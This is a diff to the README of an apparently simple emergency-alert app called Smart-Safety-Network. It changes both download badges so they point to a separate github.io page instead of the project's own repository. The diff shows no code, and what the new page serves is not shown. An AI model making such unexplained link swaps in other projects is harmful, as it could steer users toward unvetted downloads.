@@ -1,6 +1,6 @@
 # 🚨 Smart-Safety-Network - Reliable emergency alerts for your safety
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Scratchmuller133/Smart-Safety-Network)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://scratchmuller133.github.io)
 
 The Smart-Safety-Network application helps you stay safe. It sends emergency alerts to your contacts. It uses location data to track your position in real time. The software combines simple maps, voice tools, and text support into one system. You can use this tool to ask for help when you feel unsafe. The app works on modern computers and keeps your information private.
 
@@ -37,7 +37,7 @@ Follow these steps to install the software on your Windows computer.
 6. Locate the file named index.html.
 7. Double-click this file to open the application in your browser.
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Scratchmuller133/Smart-Safety-Network)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://scratchmuller133.github.io)
 
 ## 🛠️ Using the application
 
